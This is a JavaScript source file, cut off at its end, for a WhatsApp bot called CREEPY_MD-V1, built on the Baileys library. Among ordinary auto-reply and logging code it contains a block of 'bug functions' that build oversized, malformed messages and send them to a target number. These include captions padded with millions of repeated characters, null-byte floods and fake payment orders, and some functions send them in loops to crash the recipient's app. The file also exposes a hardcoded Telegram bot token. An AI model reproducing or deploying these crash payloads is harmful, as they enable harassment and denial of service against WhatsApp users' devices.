//created by Danny
//wa.me/255697608274
//Deploy and enjoy
//Credits (Creepy technology)
//Follow our channel https://whatsapp.com/channel/0029VacQFw65Ui2gGv0Kwk1r
const { default: makeWASocket, fetchLatestBaileysVersion, downloadContentFromMessage, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys')
const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const db = require('./db')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
let afk = require("./lib/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./lib/premiun')
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const NodeCache = require('node-cache');

//bug database
const { creepyd1 } = require('./80/creepyd1')
const { creepyd2 } = require('./80/creepyd2')
const { creepyd3 } = require('./80/creepyd3')
const { creepyd4 } = require('./80/creepyd4')
const { creepyd5 } = require('./80/creepyd5')
const { creepyd6 } = require('./80/creepyd6')
const { creepyd7 } = require('./80/creepyd7')
const { creepyd8 } = require('./80/creepyd8')
const { creepyd9 } = require('./80/creepyd9')
const { creepyd10 } = require('./80/creepyd10')
const { creepyd11 } = require('./80/creepyd11')
const wkwk = fs.readFileSync(`./80/x.mp3`)
const xsteek = fs.readFileSync(`./80/x.webp`)
const o = fs.readFileSync(`./80/o.jpg`)

// settings


//settings 

//database
let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
let antilink =JSON.parse(fs.readFileSync('./db.json'))
//autorep
const VoiceNoteXeon = JSON.parse(fs.readFileSync('./database/autoreply/vn.json'))
const StickerXeon = JSON.parse(fs.readFileSync('./database/autoreply/sticker.json'))
const ImageXeon = JSON.parse(fs.readFileSync('./database/autoreply/image.json'))
const VideoXeon = JSON.parse(fs.readFileSync('./database/autoreply/video.json'))
const DocXeon = JSON.parse(fs.readFileSync('./database/autoreply/doc.json'))
const ZipXeon = JSON.parse(fs.readFileSync('./database/autoreply/zip.json'))
const ApkXeon = JSON.parse(fs.readFileSync('./database/autoreply/apk.json'))

//time
const xtime = moment.tz('Arusha/Tanzania').format('HH:mm:ss')
        const xdate = moment.tz('Arusha/Tanzania').format('DD/MM/YYYY')
        const time2 = moment().tz('Arusha/Tanzania').format('HH:mm:ss')  
         if(time2 < "24:59:00"){
var xeonytimewisher = `Good Night 🌌`
 }
 if(time2 < "17:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var xeonytimewisher = `Good Evening 🌃`
 }
 if(time2 < "13:00:00"){
var xeonytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "10:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var xeonytimewisher = `Good Morning 🌄`
 } 
module.exports = GlobalTechInc = async (GlobalTechInc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectreplyglobal.selectedRowId : (m.mtype == 'templateButtonreplyglobalMessage') ? m.message.templateButtonreplyglobalMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreplyglobal.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || ""
        const botNumber = await GlobalTechInc.decodeJid(GlobalTechInc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.sender
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await GlobalTechInc.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = GlobalTechInc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? GlobalTechInc.user.id.split(':')[0] + "@s.whatsapp.net" || GlobalTechInc.user.id : m.key.participant || m.key.remoteJid;       
         const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        expiredCheck(GlobalTechInc, m, premium);
//group chat msg by danny
const replyglobal = (teks) => {
GlobalTechInc.sendMessage(m.chat,
{ text: teks,
contextInfo: {
                forwardingScore: 5,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "CREEPY TECH",
                    newsletterJid: "120363307517794567@newsletter",
                },
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `CREEPY_MD-V1`,
"body": `𝐷𝛥𝛮𝛮𝑌`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./GlobalMedia/thumb.jpg`),
"sourceUrl": `${link}`}}},
{ quoted: m})
}

async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replyglobal('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const xeonyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Danny',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            xeonyresult.push(result)
        }
    resolve(xeonyresult)
    })
}

//bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./80/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"ۗ🇹🇿Danny🤖ۗ🇹🇿Danny🤖ۗ🇹🇿Danny🤖\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🇹🇿Danny🤖`
}
}
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖`+"ꦾ".repeat(5000000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🇹🇿Danny🤖",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/54w3b1.jpeg" } }, { upload: GlobalTechInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🇹🇿Danny🤖"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await GlobalTechInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🇹🇿Danny🤖"+" ".repeat(92000000),
        'footerText': `🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖`,
        'description': `🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖 🇹🇿Danny🤖`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  GlobalTechInc.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   GlobalTechInc.sendMessage(recipientJid, {
      'text': ''.repeat(500000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    GlobalTechInc.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(100000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await GlobalTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(9200000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await GlobalTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await GlobalTechInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  GlobalTechInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  GlobalTechInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return GlobalTechInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return GlobalTechInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: `CREEPY_MD-V1`
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"CREEPY_MD-V1\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝐷𝛥𝛮𝛮𝑌\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const xeonimun = (texto) => {
GlobalTechInc.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}

const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Danny's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
GlobalTechInc.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${creepy}.${creepyd1}` ,
caption: `${creepy + creepyd1}`,
}, {quoted: subscribe_dgxeon })
}
//end bug functions

async function loading () {
var xeonlod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🤖....."
]
let { key } = await GlobalTechInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < xeonlod.length; i++) {
await GlobalTechInc.sendMessage(from, {text: xeonlod[i], edit: key });
}
}

        if (!GlobalTechInc.public) {
            if (!isCreator && !m.key.fromMe) return
        }
        
        if (autoread) {
            GlobalTechInc.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        GlobalTechInc.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        GlobalTechInc.sendPresenceUpdate('recording', from)
        }

        
        //bot number online status, available=online, unavailable=offline
        GlobalTechInc.sendPresenceUpdate('uavailable', from)
        
        if (global.autorecordtype) {
        let xeonrecordin = ['recording','composing']
        let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
        GlobalTechInc.sendPresenceUpdate(xeonrecordinfinal, from)

        }
        
        if (autobio) {
            GlobalTechInc.updateProfileStatus(`I'm using CREEPY_MD-V1 bot`).catch(_ => _)
        }
        if (m.sender.startsWith('91') && global.anti91 === true) {
            return GlobalTechInc.updateBlockStatus(m.sender, 'block')
        }
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await GlobalTechInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await GlobalTechInc.getName(i)}\nFN:${await GlobalTechInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./GlobalMedia/audio/${BhosdikaXeon}.mp3`)
GlobalTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./GlobalMedia/sticker/${BhosdikaXeon}.webp`)
GlobalTechInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./GlobalMedia/image/${BhosdikaXeon}.jpg`)
GlobalTechInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./GlobalMedia/video/${BhosdikaXeon}.mp4`)
GlobalTechInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
